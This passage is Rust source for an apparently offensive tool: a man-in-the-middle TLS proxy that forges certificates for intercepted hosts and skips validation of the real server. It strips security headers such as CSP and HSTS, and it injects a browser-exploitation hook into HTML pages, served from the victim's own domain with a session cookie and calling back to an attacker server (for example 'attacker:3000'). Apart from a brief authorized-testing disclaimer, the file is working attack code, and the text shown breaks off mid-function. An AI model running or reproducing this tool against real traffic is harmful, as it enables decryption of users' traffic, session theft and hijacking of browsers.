//! MITM TLS Proxy Implementation
//!
//! Man-in-the-Middle proxy for TLS inspection and modification.
//!
//! # How it works
//!
//! ```text
//! Client                    MITM Proxy                         Target
//!   |                           |                                 |
//!   |-- CONNECT host:443 ------>|                                 |
//!   |<-- 200 Connection OK -----|                                 |
//!   |                           |                                 |
//!   |-- TLS ClientHello ------->|                                 |
//!   |<-- TLS ServerHello -------|  [Generate fake cert for host]  |
//!   |<-- TLS Certificate -------|                                 |
//!   |-- TLS Finished ---------->|                                 |
//!   |                           |---- TLS ClientHello ----------->|
//!   |                           |<--- TLS ServerHello ------------|
//!   |                           |<--- TLS Certificate ------------|
//!   |                           |---- TLS Finished -------------->|
//!   |                           |                                 |
//!   |<==== Decrypted HTTP =====>|<==== Encrypted TLS ============>|
//! ```
//!
//! # Security Warning
//!
//! This module is for authorized security testing only.
//! Unauthorized interception of network traffic is illegal.

use std::collections::HashMap;
use std::fs::{File, OpenOptions};
use std::io::{BufWriter, Read, Write};
use std::net::{SocketAddr, TcpListener, TcpStream, ToSocketAddrs};
use std::path::PathBuf;
use std::sync::{Arc, Mutex, RwLock};
use std::thread;
use std::time::{Duration, SystemTime, UNIX_EPOCH};

use super::{Address, ProxyContext, ProxyError, ProxyResult};
use crate::crypto::certs::ca::CertificateAuthority;
use crate::modules::exploit::browser::hook as rbb_hook;
use crate::{debug, error, info};

/// Log format for traffic logging
#[derive(Clone, Copy, Debug, PartialEq, Eq)]
pub enum LogFormat {
    Text,
    Json,
}

impl LogFormat {
    pub fn from_str(s: &str) -> Self {
        match s.to_lowercase().as_str() {
            "json" => LogFormat::Json,
            _ => LogFormat::Text,
        }
    }
}

/// Traffic logger that can write to stdout and/or file
#[derive(Clone)]
pub struct TrafficLogger {
    /// Log to stdout
    pub log_stdout: bool,
    /// Log file path
    pub log_file: Option<PathBuf>,
    /// Log format
    pub format: LogFormat,
    /// File writer (shared across threads)
    file_writer: Option<Arc<Mutex<BufWriter<File>>>>,
}

impl TrafficLogger {
    pub fn new(log_stdout: bool, log_file: Option<PathBuf>, format: LogFormat) -> Self {
        let file_writer = log_file.as_ref().and_then(|path| {
            OpenOptions::new()
                .create(true)
                .append(true)
                .open(path)
                .ok()
                .map(|f| Arc::new(Mutex::new(BufWriter::new(f))))
        });

        Self {
            log_stdout,
            log_file,
            format,
            file_writer,
        }
    }

    /// Check if logging is enabled at all
    pub fn is_enabled(&self) -> bool {
        self.log_stdout || self.file_writer.is_some()
    }

    /// Log a request
    pub fn log_request(&self, hostname: &str, method: &str, path: &str, version: &str) {
        if !self.is_enabled() {
            return;
        }

        let timestamp = SystemTime::now()
            .duration_since(UNIX_EPOCH)
            .map(|d| d.as_secs())
            .unwrap_or(0);

        match self.format {
            LogFormat::Text => {
                let msg = format!("[{}] {} {} {}", hostname, method, path, version);
                self.write_line(&msg);
            }
            LogFormat::Json => {
                let json = format!(
                    r#"{{"ts":{},"type":"request","host":"{}","method":"{}","path":"{}","version":"{}"}}"#,
                    timestamp, hostname, method, path, version
                );
                self.write_line(&json);
            }
        }
    }

    /// Log a response
    pub fn log_response(&self, hostname: &str, status_code: u16, status_text: &str) {
        if !self.is_enabled() {
            return;
        }

        let timestamp = SystemTime::now()
            .duration_since(UNIX_EPOCH)
            .map(|d| d.as_secs())
            .unwrap_or(0);

        match self.format {
            LogFormat::Text => {
                let msg = format!("[{}] <- {} {}", hostname, status_code, status_text);
                self.write_line(&msg);
            }
            LogFormat::Json => {
                let json = format!(
                    r#"{{"ts":{},"type":"response","host":"{}","status":{},"status_text":"{}"}}"#,
                    timestamp, hostname, status_code, status_text
                );
                self.write_line(&json);
            }
        }
    }

    /// Log an info message
    pub fn log_info(&self, message: &str) {
        if !self.is_enabled() {
            return;
        }

        let timestamp = SystemTime::now()
            .duration_since(UNIX_EPOCH)
            .map(|d| d.as_secs())
            .unwrap_or(0);

        match self.format {
            LogFormat::Text => {
                self.write_line(message);
            }
            LogFormat::Json => {
                let json = format!(
                    r#"{{"ts":{},"type":"info","message":"{}"}}"#,
                    timestamp,
                    message.replace('"', "\\\"")
                );
                self.write_line(&json);
            }
        }
    }

    /// Log a WebSocket frame
    pub fn log_ws_frame(
        &self,
        hostname: &str,
        direction: &str,
        frame_num: u64,
        frame_type: &str,
        size: usize,
    ) {
        if !self.is_enabled() {
            return;
        }

        let timestamp = SystemTime::now()
            .duration_since(UNIX_EPOCH)
            .map(|d| d.as_secs())
            .unwrap_or(0);

        match self.format {
            LogFormat::Text => {
                let msg = format!(
                    "[{}] WebSocket {} frame #{}: {} ({} bytes)",
                    hostname, direction, frame_num, frame_type, size
                );
                self.write_line(&msg);
            }
            LogFormat::Json => {
                let json = format!(
                    r#"{{"ts":{},"type":"websocket","host":"{}","direction":"{}","frame":{},"frame_type":"{}","size":{}}}"#,
                    timestamp, hostname, direction, frame_num, frame_type, size
                );
                self.write_line(&json);
            }
        }
    }

    fn write_line(&self, line: &str) {
        if self.log_stdout {
            eprintln!("[MITM] {}", line);
        }

        if let Some(ref writer) = self.file_writer {
            if let Ok(mut w) = writer.lock() {
                let _ = writeln!(w, "{}", line);
                let _ = w.flush();
            }
        }
    }
}

/// Hook injection mode for MITM proxy
#[derive(Clone, Debug, PartialEq, Eq)]
pub enum HookMode {
    /// External URL (e.g., http://attacker:3000/hook.js) - requires CORS
    External(String),
    /// Same-origin: serve hook from intercepted domain (e.g., /assets/js/rb.js)
    /// The proxy will intercept requests to this path and serve the hook directly
    SameOrigin {
        /// Path to serve the hook from (e.g., "/assets/js/rb.js")
        path: String,
        /// RBB server URL for the hook to call back to (e.g., "http://10.0.0.1:3000")
        callback_url: String,
    },
}

/// MITM proxy configuration
#[derive(Clone)]
pub struct MitmConfig {
    /// Listen address
    pub listen_addr: SocketAddr,
    /// CA certificate and key (for signing intercepted certs)
    pub ca: Arc<CertificateAuthority>,
    /// Connection timeout
    pub timeout: Duration,
    /// Whether to log intercepted requests (deprecated, use logger)
    pub log_requests: bool,
    /// Traffic logger
    pub logger: TrafficLogger,
    /// Request/response interceptor
    pub interceptor: Option<Arc<dyn RequestInterceptor + Send + Sync>>,
    /// URL of the JS hook to inject (e.g., RBB hook) - DEPRECATED, use hook_mode
    pub hook_url: Option<String>,
    /// Hook injection mode
    pub hook_mode: Option<HookMode>,
}

impl std::fmt::Debug for MitmConfig {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        f.debug_struct("MitmConfig")
            .field("listen_addr", &self.listen_addr)
            .field("ca", &self.ca)
            .field("timeout", &self.timeout)
            .field("log_requests", &self.log_requests)
            .field(
                "logger",
                &format!(
                    "stdout={}, file={:?}, format={:?}",
                    self.logger.log_stdout, self.logger.log_file, self.logger.format
                ),
            )
            .field(
                "interceptor",
                &self.interceptor.as_ref().map(|_| "<interceptor>"),
            )
            .field("hook_url", &self.hook_url)
            .field("hook_mode", &self.hook_mode)
            .finish()
    }
}

impl MitmConfig {
    /// Create new MITM config with CA
    pub fn new(listen_addr: SocketAddr, ca: CertificateAuthority) -> Self {
        Self {
            listen_addr,
            ca: Arc::new(ca),
            timeout: Duration::from_secs(30),
            log_requests: true,
            logger: TrafficLogger::new(false, None, LogFormat::Text),
            interceptor: None,
            hook_url: None,
            hook_mode: None,
        }
    }

    /// Set request interceptor
    pub fn with_interceptor(
        mut self,
        interceptor: impl RequestInterceptor + Send + Sync + 'static,
    ) -> Self {
        self.interceptor = Some(Arc::new(interceptor));
        self
    }

    /// Set hook URL (deprecated, use with_hook_mode)
    pub fn with_hook_url(mut self, url: String) -> Self {
        self.hook_url = Some(url.clone());
        self.hook_mode = Some(HookMode::External(url));
        self
    }

    /// Set hook mode
    pub fn with_hook_mode(mut self, mode: HookMode) -> Self {
        self.hook_mode = Some(mode.clone());
        // Also set legacy hook_url for backward compatibility
        match &mode {
            HookMode::External(url) => self.hook_url = Some(url.clone()),
            HookMode::SameOrigin { path, .. } => self.hook_url = Some(path.clone()),
        }
        self
    }

    /// Configure same-origin hook mode (hook served from victim's domain)
    pub fn with_same_origin_hook(mut self, path: &str, callback_url: &str) -> Self {
        let mode = HookMode::SameOrigin {
            path: path.to_string(),
            callback_url: callback_url.to_string(),
        };
        self.hook_mode = Some(mode);
        self.hook_url = Some(path.to_string());
        self
    }

    /// Set timeout
    pub fn with_timeout(mut self, timeout: Duration) -> Self {
        self.timeout = timeout;
        self
    }

    /// Configure traffic logging
    pub fn with_logger(
        mut self,
        log_stdout: bool,
        log_file: Option<PathBuf>,
        format: LogFormat,
    ) -> Self {
        let has_file = log_file.is_some();
        self.logger = TrafficLogger::new(log_stdout, log_file, format);
        self.log_requests = log_stdout || has_file;
        self
    }

    /// Enable stdout logging (convenience method)
    pub fn with_stdout_logging(mut self) -> Self {
        self.logger = TrafficLogger::new(true, self.logger.log_file.clone(), self.logger.format);
        self.log_requests = true;
        self
    }

    /// Enable file logging (convenience method)
    pub fn with_file_logging(mut self, path: PathBuf, format: LogFormat) -> Self {
        self.logger = TrafficLogger::new(self.logger.log_stdout, Some(path), format);
        self.log_requests = true;
        self
    }
}

/// Request interceptor trait
pub trait RequestInterceptor {
    /// Called before forwarding request to target
    /// client_addr is the IP:port of the client making the request
    fn on_request(&self, req: &mut HttpRequest, client_addr: Option<&str>) -> InterceptAction;

    /// Called before returning response to client
    fn on_response(&self, req: &HttpRequest, resp: &mut HttpResponse) -> InterceptAction;
}

/// Intercept action
#[derive(Debug, Clone)]
pub enum InterceptAction {
    /// Continue with possibly modified request/response
    Continue,
    /// Drop the request/response
    Drop,
    /// Replace with custom response
    Replace(HttpResponse),
}

/// Parsed HTTP request
#[derive(Debug, Clone)]
pub struct HttpRequest {
    pub method: String,
    pub path: String,
    pub version: String,
    pub headers: HashMap<String, String>,
    pub body: Vec<u8>,
    pub host: String,
    /// Source IP address of the client making this request
    pub client_addr: Option<String>,
}

impl HttpRequest {
    /// Parse HTTP request from bytes
    pub fn parse(data: &[u8]) -> Option<Self> {
        let text = String::from_utf8_lossy(data);
        let mut lines = text.lines();

        // Parse request line
        let request_line = lines.next()?;
        let parts: Vec<_> = request_line.split_whitespace().collect();
        if parts.len() < 3 {
            return None;
        }

        let method = parts[0].to_string();
        let path = parts[1].to_string();
        let version = parts[2].to_string();

        // Parse headers
        let mut headers = HashMap::new();
        let mut host = String::new();

        for line in lines {
            if line.is_empty() {
                break;
            }
            if let Some(colon) = line.find(':') {
                let key = line[..colon].trim().to_lowercase();
                let value = line[colon + 1..].trim().to_string();
                if key == "host" {
                    host = value.clone();
                }
                headers.insert(key, value);
            }
        }

        // Find body
        let header_end = data.windows(4).position(|w| w == b"\r\n\r\n");
        let body = if let Some(pos) = header_end {
            data[pos + 4..].to_vec()
        } else {
            Vec::new()
        };

        Some(HttpRequest {
            method,
            path,
            version,
            headers,
            body,
            host,
            client_addr: None,
        })
    }

    /// Check if this is a WebSocket upgrade request
    pub fn is_websocket_upgrade(&self) -> bool {
        let connection = self
            .headers
            .get("connection")
            .map(|s| s.to_lowercase())
            .unwrap_or_default();
        let upgrade = self
            .headers
            .get("upgrade")
            .map(|s| s.to_lowercase())
            .unwrap_or_default();

        connection.contains("upgrade") && upgrade.contains("websocket")
    }

    /// Serialize request to bytes
    pub fn to_bytes(&self) -> Vec<u8> {
        let mut buf = Vec::new();

        // Request line
        buf.extend_from_slice(
            format!("{} {} {}\r\n", self.method, self.path, self.version).as_bytes(),
        );

        // Headers
        for (key, value) in &self.headers {
            buf.extend_from_slice(format!("{}: {}\r\n", key, value).as_bytes());
        }

        buf.extend_from_slice(b"\r\n");
        buf.extend_from_slice(&self.body);

        buf
    }
}

/// Parsed HTTP response
#[derive(Debug, Clone)]
pub struct HttpResponse {
    pub version: String,
    pub status_code: u16,
    pub status_text: String,
    pub headers: HashMap<String, String>,
    pub body: Vec<u8>,
}

impl HttpResponse {
    /// Parse HTTP response from bytes
    pub fn parse(data: &[u8]) -> Option<Self> {
        let text = String::from_utf8_lossy(data);
        let mut lines = text.lines();

        // Parse status line
        let status_line = lines.next()?;
        let parts: Vec<_> = status_line.splitn(3, ' ').collect();
        if parts.len() < 3 {
            return None;
        }

        let version = parts[0].to_string();
        let status_code: u16 = parts[1].parse().ok()?;
        let status_text = parts[2].to_string();

        // Parse headers
        let mut headers = HashMap::new();

        for line in lines {
            if line.is_empty() {
                break;
            }
            if let Some(colon) = line.find(':') {
                let key = line[..colon].trim().to_lowercase();
                let value = line[colon + 1..].trim().to_string();
                headers.insert(key, value);
            }
        }

        // Find body
        let header_end = data.windows(4).position(|w| w == b"\r\n\r\n");
        let body = if let Some(pos) = header_end {
            data[pos + 4..].to_vec()
        } else {
            Vec::new()
        };

        Some(HttpResponse {
            version,
            status_code,
            status_text,
            headers,
            body,
        })
    }

    /// Serialize response to bytes
    pub fn to_bytes(&self) -> Vec<u8> {
        let mut buf = Vec::new();

        // Status line
        buf.extend_from_slice(
            format!(
                "{} {} {}\r\n",
                self.version, self.status_code, self.status_text
            )
            .as_bytes(),
        );

        // Headers
        for (key, value) in &self.headers {
            buf.extend_from_slice(format!("{}: {}\r\n", key, value).as_bytes());
        }

        buf.extend_from_slice(b"\r\n");
        buf.extend_from_slice(&self.body);

        buf
    }

    /// Create a simple response
    pub fn simple(status_code: u16, status_text: &str, body: &str) -> Self {
        let mut headers = HashMap::new();
        headers.insert("content-length".to_string(), body.len().to_string());
        headers.insert("content-type".to_string(), "text/plain".to_string());

        HttpResponse {
            version: "HTTP/1.1".to_string(),
            status_code,
            status_text: status_text.to_string(),
            headers,
            body: body.as_bytes().to_vec(),
        }
    }

    /// Check if this is a WebSocket upgrade response (101 Switching Protocols)
    pub fn is_websocket_upgrade(&self) -> bool {
        self.status_code == 101
            && self
                .headers
                .get("upgrade")
                .map(|s| s.to_lowercase().contains("websocket"))
                .unwrap_or(false)
    }

    /// Strip security headers that prevent MITM/Injection
    pub fn strip_security_headers(&mut self) {
        let headers_to_strip = [
            "content-security-policy",
            "content-security-policy-report-only",
            "strict-transport-security", // HSTS downgrade
            "x-frame-options",           // Allow clickjacking/framing
            "x-xss-protection",          // Disable XSS auditor
            "x-content-type-options",    // Allow MIME sniffing
            "referrer-policy",
            "permissions-policy",
            "cross-origin-opener-policy",
            "cross-origin-embedder-policy",
            "cross-origin-resource-policy",
        ];

        for header in headers_to_strip {
            self.headers.remove(header);
        }
    }
}

/// Certificate cache for MITM
pub struct CertCache {
    /// CA for generating certificates
    ca: Arc<CertificateAuthority>,
    /// Cached certificates (hostname -> (cert_pem, key_pem))
    cache: RwLock<HashMap<String, (String, String)>>,
}

impl CertCache {
    pub fn new(ca: Arc<CertificateAuthority>) -> Self {
        Self {
            ca,
            cache: RwLock::new(HashMap::new()),
        }
    }

    /// Get or generate certificate for hostname
    pub fn get_cert(&self, hostname: &str) -> Result<(String, String), ProxyError> {
        // Check cache first
        if let Some(cached) = self.cache.read().unwrap().get(hostname) {
            return Ok(cached.clone());
        }

        // Generate new certificate
        let (cert, key_der) = self
            .ca
            .generate_cert(hostname)
            .map_err(|e| ProxyError::Tls(format!("Failed to generate cert: {}", e)))?;

        let cert_pem = cert.to_pem();
        let key_pem = {
            use crate::crypto::encoding::pem::PemBlock;
            PemBlock::with_label("PRIVATE KEY", key_der).encode()
        };

        // Cache it
        self.cache
            .write()
            .unwrap()
            .insert(hostname.to_string(), (cert_pem.clone(), key_pem.clone()));

        Ok((cert_pem, key_pem))
    }
}

/// MITM Proxy Server
pub struct MitmProxy {
    config: MitmConfig,
    context: Arc<ProxyContext>,
    cert_cache: Arc<CertCache>,
}

impl MitmProxy {
    /// Create new MITM proxy
    pub fn new(config: MitmConfig) -> Self {
        let cert_cache = Arc::new(CertCache::new(config.ca.clone()));
        Self {
            config,
            context: Arc::new(ProxyContext::default()),
            cert_cache,
        }
    }

    /// Run the MITM proxy server
    pub fn run(&self) -> ProxyResult<()> {
        let listener = TcpListener::bind(self.config.listen_addr)?;
        info!("MITM proxy listening on {}", self.config.listen_addr);
        info!("CA Subject: {}", self.config.ca.subject());
        info!("CA Fingerprint: {}", self.config.ca.fingerprint());

        for stream in listener.incoming() {
            match stream {
                Ok(client) => {
                    let config = self.config.clone();
                    let context = self.context.clone();
                    let cert_cache = self.cert_cache.clone();

                    thread::spawn(move || {
                        if let Err(e) = Self::handle_client(client, &config, &context, &cert_cache)
                        {
                            debug!("Client error: {}", e);
                        }
                    });
                }
                Err(e) => {
                    error!("Accept error: {}", e);
                }
            }
        }

        Ok(())
    }

    /// Handle a client connection
    fn handle_client(
        mut client: TcpStream,
        config: &MitmConfig,
        _context: &ProxyContext,
        cert_cache: &CertCache,
    ) -> ProxyResult<()> {
        client.set_read_timeout(Some(config.timeout))?;
        client.set_write_timeout(Some(config.timeout))?;

        let client_addr = client.peer_addr()?;
        debug!("New connection from {}", client_addr);

        // Read the initial request (expecting CONNECT)
        let mut buf = [0u8; 8192];
        let n = client.read(&mut buf)?;
        if n == 0 {
            return Ok(());
        }

        let request = String::from_utf8_lossy(&buf[..n]);

        // Parse CONNECT request
        if !request.starts_with("CONNECT ") {
            // Not a CONNECT request - could handle as regular HTTP proxy
            let response =
                "HTTP/1.1 400 Bad Request\r\n\r\nOnly CONNECT method supported for MITM\r\n";
            client.write_all(response.as_bytes())?;
            return Ok(());
        }

        // Parse target host:port
        let target = Self::parse_connect_target(&request)?;
        let hostname = target.host();
        let port = target.port();

        info!("CONNECT to {}:{}", hostname, port);

        // Connect to target
        let target_addr = format!("{}:{}", hostname, port);
        let target_stream = TcpStream::connect_timeout(
            &target_addr
                .to_socket_addrs()?
                .next()
                .ok_or_else(|| ProxyError::ResolutionFailed(hostname.clone()))?,
            config.timeout,
        )?;

        // Send 200 Connection Established
        client.write_all(b"HTTP/1.1 200 Connection Established\r\n\r\n")?;

        // Now we need to perform TLS handshake with both sides
        // 1. TLS handshake with client (we are the server)
        // 2. TLS handshake with target (we are the client)

        if port == 443 || port == 8443 {
            // TLS interception
            Self::handle_tls_intercept(client, target_stream, &hostname, config, cert_cache)
        } else {
            // Plain TCP relay
            Self::relay_tcp(client, target_stream)
        }
    }

    /// Parse CONNECT target from request
    fn parse_connect_target(request: &str) -> ProxyResult<Address> {
        // CONNECT host:port HTTP/1.1
        let first_line = request
            .lines()
            .next()
            .ok_or_else(|| ProxyError::Protocol("Empty request".into()))?;

        let parts: Vec<_> = first_line.split_whitespace().collect();
        if parts.len() < 2 {
            return Err(ProxyError::Protocol("Invalid CONNECT request".into()));
        }

        let host_port = parts[1];
        if let Some(colon) = host_port.rfind(':') {
            let host = &host_port[..colon];
            let port: u16 = host_port[colon + 1..]
                .parse()
                .map_err(|_| ProxyError::Protocol("Invalid port".into()))?;
            Ok(Address::from_domain(host, port))
        } else {
            Err(ProxyError::Protocol("Missing port in CONNECT".into()))
        }
    }

    /// Handle TLS interception
    fn handle_tls_intercept(
        client: TcpStream,
        target: TcpStream,
        hostname: &str,
        config: &MitmConfig,
        cert_cache: &CertCache,
    ) -> ProxyResult<()> {
        use boring::pkey::PKey;
        use boring::ssl::{SslAcceptor, SslConnector, SslMethod, SslVerifyMode};
        use boring::x509::X509;

        // Get/generate certificate for this hostname
        let (cert_pem, key_pem) = cert_cache.get_cert(hostname)?;

        // Create SSL acceptor (we act as server to client)
        let mut acceptor = SslAcceptor::mozilla_intermediate(SslMethod::tls())
            .map_err(|e| ProxyError::Tls(format!("Acceptor build failed: {}", e)))?;

        // Load our generated certificate
        let cert = X509::from_pem(cert_pem.as_bytes())
            .map_err(|e| ProxyError::Tls(format!("Cert parse failed: {}", e)))?;
        let key = PKey::private_key_from_pem(key_pem.as_bytes())
            .map_err(|e| ProxyError::Tls(format!("Key parse failed: {}", e)))?;

        acceptor
            .set_private_key(&key)
            .map_err(|e| ProxyError::Tls(format!("Set key failed: {}", e)))?;
        acceptor
            .set_certificate(&cert)
            .map_err(|e| ProxyError::Tls(format!("Set cert failed: {}", e)))?;

        // Add CA cert to chain
        let ca_cert = X509::from_pem(config.ca.export_ca_pem().as_bytes())
            .map_err(|e| ProxyError::Tls(format!("CA cert parse failed: {}", e)))?;
        acceptor
            .add_extra_chain_cert(ca_cert)
            .map_err(|e| ProxyError::Tls(format!("Add chain failed: {}", e)))?;

        let acceptor = acceptor.build();

        // Accept TLS from client
        let mut client_tls = acceptor
            .accept(client)
            .map_err(|e| ProxyError::Tls(format!("TLS accept failed: {}", e)))?;

        info!("TLS handshake with client complete for {}", hostname);

        // Create SSL connector (we act as client to target)
        let mut connector = SslConnector::builder(SslMethod::tls())
            .map_err(|e| ProxyError::Tls(format!("Connector build failed: {}", e)))?;

        // Don't verify target certificate (we're intercepting)
        connector.set_verify(SslVerifyMode::NONE);

        let connector = connector.build();

        // Connect TLS to target
        let mut target_tls = connector
            .connect(hostname, target)
            .map_err(|e| ProxyError::Tls(format!("TLS connect failed: {}", e)))?;

        info!("TLS handshake with target complete for {}", hostname);

        // Now relay data between the two TLS streams
        Self::relay_tls(&mut client_tls, &mut target_tls, hostname, config)
    }

    /// Relay data between two TLS streams with inspection
    fn relay_tls<S1, S2>(
        client: &mut S1,
        target: &mut S2,
        hostname: &str,
        config: &MitmConfig,
    ) -> ProxyResult<()>
    where
        S1: Read + Write,
        S2: Read + Write,
    {
        if config.hook_mode.is_some() {
            Self::relay_tls_with_hook(client, target, hostname, config)
        } else {
            Self::relay_tls_inspect(client, target, hostname, config)
        }
    }

    /// Generate a unique session ID for RBB hook
    fn generate_session_id() -> String {
        use std::time::{SystemTime, UNIX_EPOCH};

        let timestamp = SystemTime::now()
            .duration_since(UNIX_EPOCH)
            .unwrap_or_default()
            .as_nanos();

        // Mix timestamp with random-ish data from stack address
        let stack_var: u64 = 0;
        let addr = &stack_var as *const u64 as u64;
        let mixed = timestamp as u64 ^ addr.wrapping_mul(0x517cc1b727220a95);

        // Format as hex string (16 chars)
        format!("{:016x}", mixed)
    }

    /// Generate a fake JS response for same-origin hook serving with session cookie
    fn generate_hook_response(callback_url: &str, hostname: &str) -> HttpResponse {
        let session_id = Self::generate_session_id();
        let js_body = rbb_hook::generate_hook_js_with_session(callback_url, &session_id);

        let mut headers = HashMap::new();
        headers.insert(
            "content-type".to_string(),
            "application/javascript; charset=utf-8".to_string(),
        );
        headers.insert("content-length".to_string(), js_body.len().to_string());
        headers.insert(
            "cache-control".to_string(),
            "no-cache, no-store, must-revalidate".to_string(),
        );
        headers.insert("pragma".to_string(), "no-cache".to_string());
        headers.insert("expires".to_string(), "0".to_string());

        // Set session cookie - HttpOnly=false so JS can read it, SameSite=None for cross-site callbacks
        // Domain set to hostname root to work across subdomains
        let root_domain = Self::get_root_domain(hostname);
        headers.insert(
            "set-cookie".to_string(),
            format!(
                "_rb_sid={}; Path=/; Domain={}; SameSite=Lax; Max-Age=86400",
                session_id, root_domain
            ),
        );

        HttpResponse {
            version: "HTTP/1.1".to_string(),
            status_code: 200,
            status_text: "OK".to_string(),
            headers,
            body: js_body.into_bytes(),
        }
    }

    /// Extract root domain from hostname (e.g., www.example.com -> example.com)
    fn get_root_domain(hostname: &str) -> String {
        let parts: Vec<&str> = hostname.split('.').collect();
        if parts.len() >= 2 {
            // Return last two parts (e.g., example.com)
            format!(".{}.{}", parts[parts.len() - 2], parts[parts.len() - 1])
        } else {
            hostname.to_string()
        }
    }

    /// Relay with HTML injection hook (supports both external and same-origin modes)
    fn relay_tls_with_hook<S1, S2>(
        client: &mut S1,
        target: &mut S2,
        hostname: &str,
        config: &MitmConfig,
    ) -> ProxyResult<()>
    where
        S1: Read + Write,
        S2: Read + Write,
    {
        let hook_mode = config.hook_mode.as_ref().unwrap();
        let mut client_buf = [0u8; 65536]; // Larger buffer for injection
        let mut target_buf = [0u8; 65536];

        // Determine injection script tag and hook path for interception
        let (inject_script, intercept_path, callback_url) = match hook_mode {
            HookMode::External(url) => {
                // External mode: inject full URL, no interception
                (format!("<script src=\"{}\"></script>", url), None, None)
            }
            HookMode::SameOrigin { path, callback_url } => {
                // Same-origin mode: inject relative path, intercept requests to that path
                (
                    format!("<script src=\"{}\"></script>", path),
                    Some(path.clone()),
                    Some(callback_url.clone()),
                )
            }
        };

        loop {
            // 1. Read Request from Client
            let n = match client.read(&mut client_buf) {
                Ok(0) => break,
                Ok(n) => n,
                Err(ref e) if e.kind() == std::io::ErrorKind::WouldBlock => {
                    continue;
                }
                Err(e) => return Err(e.into()),
            };

            // Parse and modify request
            let mut data_to_send = client_buf[..n].to_vec();
            let mut is_websocket_upgrade = false;
            let mut serve_hook_directly = false;

            if let Some(mut req) = HttpRequest::parse(&data_to_send) {
                config
                    .logger
                    .log_request(hostname, &req.method, &req.path, &req.version);

                // Check if this request is for our hook path (same-origin mode)
                if let Some(ref hook_path) = intercept_path {
                    // Match the path exactly or with query string
                    let req_path_clean = req.path.split('?').next().unwrap_or(&req.path);
                    if req_path_clean == hook_path {
                        config.logger.log_info(&format!(
                            "[{}] Intercepting hook request: {} -> serving RBB hook",
                            hostname, req.path
                        ));
                        serve_hook_directly = true;
                    }
                }

                // Check for WebSocket upgrade request
                if req.is_websocket_upgrade() {
                    config.logger.log_info(&format!(
                        "[{}] WebSocket upgrade request detected (hook mode)",
                        hostname
                    ));
                    is_websocket_upgrade = true;
                    // Don't modify WebSocket upgrade requests
                } else if !serve_hook_directly {
                    // Strip Accept-Encoding to prevent gzip (crucial for injection)
                    if req.headers.remove("accept-encoding").is_some() {
                        debug!("Stripped Accept-Encoding from {}", hostname);
                        data_to_send = req.to_bytes();
                    }
                }
            }

            // If this is a hook request in same-origin mode, serve it directly without forwarding
            if serve_hook_directly {
                if let Some(ref cb_url) = callback_url {
                    let resp = Self::generate_hook_response(cb_url, hostname);
                    config
                        .logger
                        .log_response(hostname, resp.status_code, &resp.status_text);
                    config.logger.log_info(&format!(
                        "[{}] Served RBB hook ({} bytes) with session cookie - callback: {}",
                        hostname,
                        resp.body.len(),
                        cb_url
                    ));
                    client.write_all(&resp.to_bytes())?;
                    continue;
                }
            }

            // Forward to target
            target.write_all(&data_to_send)?;

            // 2. Read Response from Target
            let m = match target.read(&mut target_buf) {
                Ok(0) => break,
                Ok(m) => m,
                Err(e) => return Err(e.into()),
            };

            let mut resp_data = target_buf[..m].to_vec();

            // Handle WebSocket upgrade response
            if is_websocket_upgrade {
                if let Some(resp) = HttpResponse::parse(&resp_data) {
                    config
                        .logger
                        .log_response(hostname, resp.status_code, &resp.status_text);

                    if resp.is_websocket_upgrade() {
                        config.logger.log_info(&format!(
                            "[{}] WebSocket upgrade accepted (101 Switching Protocols)",
                            hostname
                        ));
                        // Forward the upgrade response to client
                        client.write_all(&resp_data)?;
                        // Switch to WebSocket passthrough mode
                        return Self::websocket_passthrough(
                            client,
                            target,
                            hostname,
                            &config.logger,
                        );
                    }
                }
                // Not a valid WebSocket upgrade, forward response anyway
                client.write_all(&resp_data)?;
                continue;
            }

            // Try to inject if HTML (non-WebSocket responses only)
            if let Some(mut resp) = HttpResponse::parse(&resp_data) {
                // Strip security headers to allow injection and framing
                resp.strip_security_headers();

                let content_type = resp
                    .headers
                    .get("content-type")
                    .map(|s| s.to_lowercase())
                    .unwrap_or_default();

                if content_type.contains("text/html") {
                    let body_str = String::from_utf8_lossy(&resp.body);
                    // Check if we can inject
                    if body_str.contains("</body>") {
                        let hook_script = format!("{}</body>", inject_script);
                        let new_body_str = body_str.replace("</body>", &hook_script);

                        resp.body = new_body_str.into_bytes();

                        // Update Content-Length
                        resp.headers
                            .insert("content-length".to_string(), resp.body.len().to_string());

                        config
                            .logger
                            .log_info(&format!("Injected hook into response from {}", hostname));
                        resp_data = resp.to_bytes();
                    }
                }

                config
                    .logger
                    .log_response(hostname, resp.status_code, &resp.status_text);
            }

            // Forward to client
            client.write_all(&resp_data)?;
        }

        Ok(())
    }

    /// Relay data between two TLS streams with inspection and header stripping
    fn relay_tls_inspect<S1, S2>(
        client: &mut S1,
        target: &mut S2,
        hostname: &str,
        config: &MitmConfig,
    ) -> ProxyResult<()>
    where
        S1: Read + Write,
        S2: Read + Write,
    {
        let mut client_buf = [0u8; 16384];
        let mut target_buf = [0u8; 16384];

        loop {
            // Try to read from client
            match client.read(&mut client_buf) {
                Ok(0) => {
                    debug!("Client closed connection to {}", hostname);
                    break;
                }
                Ok(n) => {
                    let mut data_to_send = client_buf[..n].to_vec();
                    let mut is_websocket_upgrade = false;

                    // Parse request to log or strip headers
                    if let Some(mut req) = HttpRequest::parse(&data_to_send) {
                        config
                            .logger
                            .log_request(hostname, &req.method, &req.path, &req.version);

                        // Check for WebSocket upgrade request
                        if req.is_websocket_upgrade() {
                            config.logger.log_info(&format!(
                                "[{}] WebSocket upgrade request detected",
                                hostname
                            ));
                            is_websocket_upgrade = true;
                            // Don't modify WebSocket upgrade requests
                        } else {
                            // Strip Accept-Encoding to prevent compression (only for non-WebSocket)
                            if req.headers.remove("accept-encoding").is_some() {
                                data_to_send = req.to_bytes();
                            }
                        }
                    }

                    // Forward to target
                    target.write_all(&data_to_send)?;

                    // If this was a WebSocket upgrade, handle the response and switch to passthrough
                    if is_websocket_upgrade {
                        // Read the upgrade response
                        let m = match target.read(&mut target_buf) {
                            Ok(0) => break,
                            Ok(m) => m,
                            Err(e) => return Err(e.into()),
                        };

                        let resp_data = &target_buf[..m];

                        if let Some(resp) = HttpResponse::parse(resp_data) {
                            config.logger.log_response(
                                hostname,
                                resp.status_code,
                                &resp.status_text,
                            );

                            if resp.is_websocket_upgrade() {
                                config.logger.log_info(&format!(
                                    "[{}] WebSocket upgrade accepted (101 Switching Protocols)",
                                    hostname
                                ));
                                // Forward the upgrade response to client
                                client.write_all(resp_data)?;
                                // Switch to WebSocket passthrough mode
                                return Self::websocket_passthrough(
                                    client,
                                    target,
                                    hostname,
